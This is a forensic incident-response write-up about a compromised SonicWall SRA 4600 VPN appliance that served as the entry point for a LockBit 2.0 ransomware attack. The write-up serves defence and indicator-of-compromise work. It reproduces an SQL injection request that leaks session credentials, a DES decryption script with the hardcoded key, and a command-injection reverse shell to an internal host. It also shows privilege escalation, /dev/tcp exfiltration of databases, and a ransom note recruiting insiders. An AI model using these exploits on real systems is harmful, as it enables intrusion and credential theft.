Suspicious SSH logons on\nthe Hypervisor originated from an End-of-Life VPN Appliance (SonicWall SRA 4600). It turns\nout, this was the initial entry point for the Ransomware attack. Follow us into the forensics\nanalysis of this compromised device.\n\n## Finding the Logs\n\nAfter isolating the VPN Appliance from the Internet and from the internal Network, the\ncustomer gave us the credentials for the web based administration interface.\n\nUnfortunately, all log listings in the graphical interfaces were almost empty:\n\n\n-----\n\nAfter sifting through all the available features, we found an interesting Tech Support Report\nfeature under System > Diagnostics:\n\nThe feature downloads a ZIP file containing interesting logs of the system and an export of\nits configuration:\n\n\n-----\n\n```\nstatus.txt\npersist.db.log.1\nmcd.log.1\neventlog.1\ngeoBotD.log.1\ntunneld.conf\ntunneld.log\nvmctl.log\nwafStats.db.log\nsmtp.conf\nsonicfiles.log\nsso_proxy.log\ntemp.db.log\nsettings.json\nsmm.log\nmcd.log\nnxlog.log\npersist.db.log\nkernel.log\nlogrotate.conf\nlogrotateVA.conf\nhttpd.log\nhttpd.log.1\ngeoBotD.log\nha.log\nhtml5Client.log\nexamples.db.log\nfirebase.conf\nfirebase.log\nftpd.log\ndhcpc.log\ndtls.log\neventlog\nboot.log\nclientsDownload.log\n\n```\nThese logs hold very valuable information, if and only if the system was not shut down.\nThe following files in particular were of interest:\n\n## eventlog\n\nThe `eventlog records successful and failed logins on both the VPN and the web interface.`\nThe following information is also recorded:\n\ntimestamp\nusername\nsource IP address\n\n\n-----\n\n```\nNov 26 11:26:26 sslvpn SSLVPN: id sslvpn sn [CUT BY COMPASS] time 2021 11 26\n09:26:26\" vp_time=\"2021-11-26 09:26:26 UTC\" fw=10.100.132.2 pri=5 m=1 c=1 src=[CUTBY-COMPASS] dst=[CUT-BY-COMPASS] user=\"xyz\" usr=\"xyz\" msg=\"User login successful\"\nportal=\"VirtualOffice\" domain=\"[CUT-BY-COMPASS]\" agent=\"Mozilla/5.0 (Windows NT 10.0;\nWin64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36\"\nNov 26 11:28:02 sslvpn SSLVPN: id=sslvpn sn=[CUT-BY-COMPASS] time=\"2021-11-26\n09:28:02\" vp_time=\"2021-11-26 09:28:02 UTC\" fw=10.100.132.2 pri=5 m=1 c=1 src=[CUTBY-COMPASS] dst=[CUT-BY-COMPASS] user=\"xyz\" usr=\"xyz\" msg=\"User login successful\"\nportal=\"VirtualOffice\" domain=\"[CUT-BY-COMPASS]\" agent=\"SonicWALL NetExtender for\nWindows 10.2.315 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1)\"\nNov 26 11:28:05 sslvpn SSLVPN: id=sslvpn sn=[CUT-BY-COMPASS] time=\"2021-11-26\n09:28:05\" vp_time=\"2021-11-26 09:28:05 UTC\" fw=10.100.132.2 pri=5 m=0 c=1200 src=\n[CUT-BY-COMPASS] dst=10.100.132.2 user=\"xyz\" usr=\"xyz\" msg=\"Start NetExtender\nconnection\" agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101\nFirefox/85.0\"\nNov 26 11:28:05 sslvpn SSLVPN: id=sslvpn sn=[CUT-BY-COMPASS] time=\"2021-11-26\n09:28:05\" vp_time=\"2021-11-26 09:28:05 UTC\" fw=10.100.132.2 pri=5 m=0 c=1200 src=\n[CUT-BY-COMPASS] dst=10.100.132.2 user=\"Proxy\" usr=\"Proxy\" msg=\"23717:Returning 200\nOK Status\" agent=\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101\nFirefox/85.0\"\nNov 26 11:28:06 sslvpn SSLVPN: id=sslvpn sn=[CUT-BY-COMPASS] time=\"2021-11-26\n09:28:06\" vp_time=\"2021-11-26 09:28:06 UTC\" fw=10.100.132.2 pri=5 m=18 c=101 src=\n[CUT-BY-COMPASS] dst=[CUT-BY-COMPASS] user=\"xyz\" usr=\"xyz\" msg=\"NetExtender\nconnected\" rule=access-policy proto=NetExtender agent=\"Mozilla/5.0 (Windows NT 10.0;\nWin64; x64; rv:85.0) Gecko/20100101 Firefox/85.0\"\nNov 27 11:07:39 sslvpn SSLVPN: id=sslvpn sn=C0EAE4915E4C time=\"2021-11-27 10:07:39\"\nvp_time=\"2021-11-27 10:07:39 UTC\" fw=10.100.132.2 pri=5 m=3 c=3 src=10.100.132.55\ndst=10.100.132.2 user=\"asd\" usr=\"asd\" msg=\"Login failed - Incorrect\nusername/password\" agent=\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0)\nGecko/20100101 Firefox/93.0\"\nNov 27 11:35:43 sslvpn SSLVPN: id=sslvpn sn=C0EAE4915E4C time=\"2021-11-27 10:35:43\"\nvp_time=\"2021-11-27 10:35:43 UTC\" fw=10.100.132.2 pri=5 m=1 c=1 src=10.100.132.55\ndst=10.100.132.2 user=\"admin\" usr=\"admin\" msg=\"User login successful\"\nportal=\"VirtualOffice\" domain=\"LocalDomain\" agent=\"Mozilla/5.0 (X11; Ubuntu; Linux\nx86_64; rv:93.0) Gecko/20100101 Firefox/93.0\"\n\n## mcd.log\n\n```\nThe `mcd.log records successful VPN connections.

This included traces of used exploit`\ntechniques. We will now dive into these.\n\n## Reconstructing the Attack\n\nThrough analysis of the event logs, suspicious logons could be identified. The source IP\naddress was located in countries where the customer had no employees and the logon times\nwere unusual and matched with the Ransomware attack. However, it was at first not clear if\nthe attacker obtained credentials through phishing or through a vulnerability in the VPN\nappliance.\n\nThe appliance was not on the company’s inventory and therefore they were not aware that\nan EOL device was running in their network.\n\nHence we searched online to see if there were known flaws in this particular firmware\nversion.\n\n## Unauthenticated SQL Injection\n\nThe used firmware was vulnerable to an unauthenticated SQL injection, that allows to read\ncached credentials of active sessions from the database. For more information about this\n[issues, check the writeup by Crowdstrike. SonicWall issued a patch for this issue. However,](https://www.crowdstrike.com/blog/how-ecrime-groups-leverage-sonicwall-vulnerability-cve-2019-7481/)\nbecause the SRA 4600 appliance is considered End-of-Life, no Firmware upgrade was\nreleased for the device.\n\nThe leaked cached credentials are plaintext VPN user passwords, encrypted with a key that\nis hardcoded in the appliances firmware. The following request was crafted based on the\nvulnerability writeup. It allowed us to test the exploitability against the SRA appliance:\n```\nPOST /cgi-bin/supportInstaller HTTP/1.1\nHost: 10.100.132.2\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101\nFirefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: de,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 126\nfromEmailInvite=1&customerTID=\"impossible'+UNION+SELECT+0,0,userType,userName,0,passwo\n-\"\n\n```\n\n-----\n\nIf there is a session on the device, the encrypted password is returned in the supportcode\nJavaScript variable:\n```\nHTTP/1.1 200 OK\nDate: Fri, 26 Nov 2021 14:40:21 GMT\nServer: SonicWALL SSL-VPN Web Server\nX-FRAME-OPTIONS: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nContent-Security-Policy: script-src https://*.duosecurity.com 'self' 'unsafe-inline'\n'unsafe-eval'; object-src 'self'; style-src 'self' 'unsafe-inline'\nReferrer-Policy: strict-origin\nX-Content-Type-Options: nosniff\nConnection: close\nContent-Type: text/html; charset=UTF-8\nContent-Length: 3141\n[CUT BY COMPASS}\n<script src=\"/js/schemeurl.9.0.0.5-19sv.js\" type=\"text/javascript\" charset=\"utf-8\">\n</script>\n<script>\nvar servername = \"10.100.132.2\";\nvar port = \"443\";\nvar strsession = \"\";\nvar serverversion = \"150994952\";\nvar username = \"admin\";\nvar portalname = \"2\";\nvar userdomain = \"\";\nvar supportcode = \"2D0A5C61578B2D70FEA65F4C5868A8DAA2ECB2DB9D203EEE\";\nvar ticket =\n\"&00000000000000053610>>50000:46000000000008000;0000000000Pq0000000070000000000ee04000\nvar expertname = \"0\";\nvar fullControl = \"4\";\nvar sonicwallSMAConnectAgentVersion = \"1.1.25\";\n[CUT BY COMPASS]\n\n```\nThe encrypted password can be decrypted using a simple python script (based on the\nCrowdStrike writeup):\n\n\n-----\n\n```\n# use python3 and pip install pycryptodomex\nfrom Cryptodome.Cipher import DES\ndef des_decrypt(ct):\n key = b'\\x2f\\x4f\\x2a\\x86\\xd5\\x52\\xf8\\x80'\n cipher = DES.new(key, DES.MODE_CBC, iv=b'\\x00'*8)\n return cipher.decrypt(ct)\ndef decrypt_hex_to_str(h):\n pt = des_decrypt(bytes.fromhex(h))\n return pt.rstrip(b'\\x00').decode()\npassword_enc = '2D0A5C61578B2D70FEA65F4C5868A8DAA2ECB2DB9D203EEE'\npassword = decrypt_hex_to_str(password_enc)\nprint(password)\n\n```\nIf there is no valid session, an HTTP error 500 is returned. This server error leaves valuable\nevidence in the `httpd.log :`\n```\n[Fri Nov 26 11:19:44 2021] [error] [client 10.100.132.55] Premature end of script\nheaders: supportInstaller\n\n```\nThis can be used as an IOC (Indicator of compromise), as attackers likely enumerate all\nactive sessions and trigger this error. The logs of the appliance we looked at had these\nentries occurring periodically. This indicates the attackers were regularly collection plain\n**text passwords over a longer period of time.**\n\n## Authenticated OS Command Injection\n\nAnother log entry in the `httpd.log caught our attention:`\n```\nhttpd.log:[Fri Nov 26 11:36:21 2021] [error] [client 10.100.132.55] sh: line 4:\nsyntax error near unexpected token `(', referer: https://10.100.132.2/\nhttpd.log:[Fri Nov 26 11:36:21 2021] [error] [client 10.100.132.55] sh: line 4:\n`HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101\nFirefox/93.0', referer: https://10.100.132.2/\n\n```\nThis hints to a failed command injection with the user agent header involved. Several GitHub\nrepositories with exploits for a similar vulnerabilities can be found:\n\n[https://github.com/darrenmartyn/visualdoor](https://github.com/darrenmartyn/visualdoor)\n[https://github.com/0xf4n9x/SonicWall_SSL-VPN_EXP](https://github.com/0xf4n9x/SonicWall_SSL-VPN_EXP)\n\nHowever, the URL paths used in these exploits returned an HTTP 404 error on the analyzed\nSRA. This means, the appliance is probably not vulnerable for this vulnerability. So, the hunt\ngoes on…\n\nAfter analyzing the configuration some more, we found a hint in the Bookmarks\nconfiguration:\n\n\n-----\n\nBookmarks can be used to configure a link to a service in the internal network: SSH, RDP,\nSMB for instance. These links are then available on the SSL VPN “Virtual Office” web portal\nand can be accessed easily by end-users through the browser.\n\nHere the attackers seemed to exploit a command injection vulnerability in the MAC address\nfield of a Wake-On-Lan feature of the RDP Bookmark. There is actually an input validation\nthat prohibits the creation of such an arbitrary MAC addresses, but it is only implemented in\nclient-side JavaScript. This can therefore be bypassed easily, for example by submitting the\nform manually with the JavaScript debug console:\n\n\n-----\n\nThe payload `0a:00:27:00:00:01`env|sh`` executes the `env command in a subshell.`\nThis prints all environment variables and pipes it into the shell `sh, therefore interpreting`\nand executing all environment variables as shell commands. Because the Wake-On-Lan\ncommand is executed in a `cgi-bin environment, the` `env` command prints the following\nvariables:\n\n\n-----\n\n```\nSERVER_SIGNATURE \nHTTP_SEC_FETCH_DEST=document\nHTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101\nFirefox/95.0\nSERVER_PORT=443\nHTTP_HOST=10.100.132.2\nDOCUMENT_ROOT=/usr/src/EasyAccess/www/htdocs\nSCRIPT_FILENAME=/usr/src/EasyAccess/www/cgi-bin/tscbookmark\nHTTPS=on\nREQUEST_URI=/cgi-bin/tscbookmark?method=html5&bmId=10&swcctn=1[CUT BY COMPASS]s\nSCRIPT_NAME=/cgi-bin/tscbookmark\nSCRIPT_URI=https://10.100.132.2/cgi-bin/tscbookmark\nHTTP_CONNECTION=close\nREMOTE_PORT=37872\nWAF_NOT_LICENSED=1\nPATH=/bin:/sbin:/usr/bin:/usr/sbin\nHTTP_TE=trailers\n_=/usr/bin/env\nSCRIPT_URL=/cgi-bin/tscbookmark\n[CUT BY COMPASS]\n\n```\nMost of them are interpreted as valid shell statements; they define shell variables. On the\nline that starts with `HTTP_USER_AGENT, spaces break the shell statement and triggers an`\nerror in the log that can be used an an IOC:\n```\n[Thu Dec 16 11:40:36 2021] [error] [client 10.100.132.55] sh: line 4: syntax error\nnear unexpected token `(', referer: https://10.100.132.2/\n[Thu Dec 16 11:40:36 2021] [error] [client 10.100.132.55] sh: line 4:\n`HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101\nFirefox/95.0', referer: https://10.100.132.2/\n\n```\nBecause the `User-Agent header is under control of the attacker, he can inject shell`\ncommands by inserting a malicious values in the request that triggers the execution of the\nWake-On-Lan command.\n\nTo trigger the vulnerability, the bookmark is clicked on the “Virtual Office” portal of the\naccording user:\n\n\n-----\n\nMultiple request are sent to the server. The one of interest is the request to `/cgi-`\n```\nbin/tscbookmark . Here, a reverse shell is started:\nGET /cgi-bin/tscbookmark?method=html5&bmId=10&swcctn=1[CUT BY COMPASS]Z HTTP/1.1\nHost: 10.100.132.2\nCookie: [CUT BY COMPASS]\nUser-Agent: bla;bash -i >& /dev/tcp/10.100.132.55/12345 0>&1\nAccept:\ntext/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://10.100.132.2/\nTe: trailers\nConnection: close\n\n```\n**Because bookmarks can be created by standard SSL VPN users, this attack can be**\n**used to elevate privileges and extract the appliance configuration that holds**\n**interesting information and potentially other credentials. The vulnerability seems not to**\nbe exploitable without prior authentication.\n\n## Analyzing the SRA System\n\nThe next important step was to check the system in depth to see which credentials were\nstored and potentially could be obtained by the attacker.\n\n## Elevating Privileges to root\n\nThe analysis was performed through the reverse shell obtained with the OS command\ninjection vulnerability. This shell is running under user `nobody . This means not all files on`\nthe system can be accessed:\n\n\n-----\n\n```\n$ nc l 12345\nbash: no job control in this shell\nbash-4.2$ whoami\nnobody\n\n```\nTo overcome this issue, a privilege escalation was performed on the system to obtain root\nrights. We searched for executables writeable by everyone with the command `find . -`\n```\ntype f -perm 777 2>/dev/null and found shell script that is invoked automatically by the\nroot user, when accessing certificate management on the admin interface:\nlrwxrwxrwx 1 root nobody 21 Feb 11 2021 /etc/EasyAccess/var/cert/password.sh ->\nnewcert-3/password.sh\n-rwxrwxrwx 1 root root 21 Dec 16 15:21 /etc/EasyAccess/var/cert/newcert-3/password.sh\n\n```\nThe content of the script was replaced with a reverse shell payload and was invoked by\naccessing the certificate management on the admin interface:\n\nThe obtained reverse shell was running with root permissions:\n```\n$ nc -l 9876\nbash: no job control in this shell\nbash-4.2# whoami\nwhoami\nroot\n\n```\nNote that this backdoor is persisted over reboots.\n\n## Finding Stored Credentials\n\n\n-----\n\nThe administrative web application is run as a cgi-bin based application. The callable\nendpoints are located in the folder `/usr/src/EasyAccess/www/cgi-bin . They are small`\ncompiled binaries that call the main logic of the SRA in the shared library located\nat `/lib/libSys.so . To store data, a persistent`\n( /etc/EasyAccess/var/conf/persist.db ) and a non-persistent ( /tmp/temp.db )\nSQLight database is used. All these files can be exfiltrated, for instance by sending them to\na remote host via TCP ( cat /tmp/temp.db > /dev/tcp/10.100.132.55/23456 ) or\nencoding / decoding them with base64 to stdout ( openssl base64 -in temp.db ).\n\nThe `temp.db contains the session credentials that could be exfiltrated with the SQL`\nInjection attack described above.\n\nThe `persist.db is storing the applications configuration. It can also be exported in JSON`\nformat (named `settings.json ) in the diagnostic export or in the settings export feature on`\nthe admin interface.\n\nCredentials used to connect to the Active Directory (AD) were found in the `Domains_AD`\ntable. The password is encrypted with the same hardcoded key as for the sessions above\nand therefore must be seen as compromised.\n\nOther credentials named `securePasswd` were found in the Users table:\n\n\n-----\n\nBy inspecting the related code in `libSys.so, it was found that this data is generated by the`\npassword hashing function PKCS5_PBKDF2_HMAC using a hardcoded salt, 256 bit key and\n12800 iterations:\n\n\n-----\n\nAn attacker can t reverse the key-derivation function, but can perform offline brute force\nattacks. However, this is slow due to the algorithm and the used iterations. Therefore, we\nassumed the attacker did not have access to the cleartext credentials.\n\nLastly, the root password was found in the /etc/shadow file, hashed using a simple Linux\nMD5 algorithm:\n```\nbash-4.2# cat /etc/shadow\ncat /etc/shadow\nroot:$1$nRh/kvy.$QGgtuH.UQBnBpu0IuL9ze.:13983:0:99999:7:::\nbin:x:13937:0:99999:7:::\ndaemon:x:13937:0:99999:7:::\nmail:x:13937:0:99999:7:::\nsquid:x:13937:0:99999:7:::\nntp:x:13937:0:99999:7:::\nsshd:x:13937:0:99999:7:::\nnobody:x:13937:0:99999:7:::\nsnort:x:13937:0:99999:7:::\nlogwatch:x:13937:0:99999:7:::\ndnsmasq:x:13937:0:99999:7:::\ncron:x:13937:0:99999:7:::\nadmin::13937:0:99999:7:::\n\n```\nBruteforcing it with John the Ripper showed that password was “password”.\nThis may be a factory default, but is not exploitable, since the root user can’t be used to\nlogon to the system.\n\n## Searching for Malicious Activity\n\nUnfortunately, it was not possible to reconstruct what commands the attacker executed on\nthe system.\n\nNo signs of persistence or malicious activity was detected by quickly analyzing the filesystem\ntimestamps (searching for recently created files) or the running processes over the root shell.\nHowever, we did not perform a thorough analysis of the system.\n\n## Takeaways\n\nThese forensic evidences helped during the analysis of the Ransomware attack, as it\nallowed to define good IOCs which could be searched for on the corporate systems:\n\nDate and time when attacks were performed, obtained from the SRA logs.\nInternal IP address of the SRA itself and the IP address range of the VPN pool\nobtainable in the configuration.\nSuspicious external IP addresses used to connect to the SRA obtainable from the SRA\nlog data.\nCompromised accounts identified through VPN logons from suspicious IP addresses in\nthe SRA log data\n\n\n-----\n\nPotentially compromised accounts where credentials were stored on the SRA with the\nreversible DES encryption.\n\nGenerally the following actions can be recommended if a VPN appliance is found to be\ncompromised:\n\n**Don’t reboot the appliance, important information will be lost. Rather isolate the**\nsystem, so that no inbound and outbound connection to untrusted or sensitive systems\nare possible.\nReplace the VPN appliance if it is End-of-Life!\n\nSpecifically for SonicWall SRA, the following actions can help during a forensic investigation:\n\nPerform the diagnostics export, analyze the logs and check for stored credentials that\ncan be easily decrypted.\nPerform the revers shell attack to export the `temp.db and check for stored`\ncredentials that can be easily decrypted. (No root shell access is required for this, as\nthe database is readable by the nobody user.)\n\n## Notes on Lockbit 2.0 Ransomware\n\nThe attackers abused the SRA vulnerability to gain access to the customers network. The\ncompromised users were AD users and could be used to logon to other Windows systems.\nThrough Windows credentials dumping they obtained the Domain Admin credentials, which\nunfortunately were the same used for the root user of the ESXi server.\n\nTherefore the attackers were able to logon to the ESXi Hypervisor and ran the LockBit 2.0\nRansomware.\n\nThey left following file named `!!!-Restore-My-Files-!!! that threatens the customer to`\nleak its data and also contains an interesting advertisement for future criminals. It claims\nLockBit 2.0 to be the fasted ransomware:\n\n\n-----\n\n```\n  LockBit 2.0 the fastest ransomware in the world\n>>>> Your data are stolen and encrypted\nThe data will be published on TOR website if you do not pay the ransom\n[CUT BY COMPASS]\n>>>> Advertisement\nWould you like to earn millions of dollars $$$ ?\nOur company acquire access to networks of various companies, as well as insider\ninformation that can help you steal the most valuable data of any company.\nYou can provide us accounting data for the access to any company, for example, login\nand password to RDP, VPN, corporate email, etc.\nOpen our letter at your email. Launch the provided virus on any computer in your\ncompany.\nYou can do it both using your work computer or the computer of any other employee in\norder to divert suspicion of being in collusion with us.\nCompanies pay us the foreclosure for the decryption of files and prevention of data\nleak.\n[CUT BY COMPASS]\n\n```\nIndeed after checking the timestamps of the Lockbit files, it turned out that the attacker only\nrequired 5 minutes to encrypt all files. Fully encrypting all VMDKs of a ESXi Hypervisor\nshould require more time, so we checked the encryption of the VMDKs and of some log files\nthat had the `.lockbit suffix appended to them.`\n\nQuickly running the command `strings or opening the files in an editor, showed that major`\nparts of the files were not encrypted. Here are some entropy analysis performed with\n```\nDetect It Easy :\n\n```\nLog file:\n\n\n-----\n\nVMDK:\n\n\n-----\n\nOn the VMDK there seemed to be no encryption at all. It was possible to use 7Zip to extract\nthe VMDK, mount the raw partition image and perform a forensic analysis of the data. That\nwould not been possible with a fully encrypted VMDK.\n\nEven if partial encryption is used, as for the log file, it would be possible to recover evidence\nfrom these images by file carving for forensic artifacts like Windows event logs.\n\n**We therefore recommend to always check the entropy of encrypted files.**\n\n\n-----",
